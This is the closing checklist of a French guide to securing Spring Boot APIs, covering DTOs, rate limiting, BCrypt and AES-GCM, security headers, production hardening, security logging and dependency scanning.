- [ ] DTO dédiés, jamais d'entité en `@RequestBody` (§7.4)
- [ ] Rate limiting sur l'auth (OTP !) et l'API (§8)
- [ ] BCrypt pour tout ce qui se vérifie, AES-GCM pour ce qui se relit (§9)
- [ ] Headers de sécurité + HTTPS partout (§10 + guide 3 §9.3)
- [ ] Swagger et stacktraces désactivés en prod (§7.5)

### Surveillance

- [ ] Logs des événements de sécurité, sans données sensibles (§11)
- [ ] Audit `@CreatedBy`/`@LastModifiedBy` sur les entités critiques
- [ ] Alerte sur les pics de 401/403/429
- [ ] Dépendances scannées régulièrement (`mvn org.owasp:dependency-check-maven:check`, Dependabot sur GitHub)

---

*Guide n°4 de la série. Complète les guides « API & Clean Architecture », « Annotations & Tests » et « Déploiement & CI/CD ».*
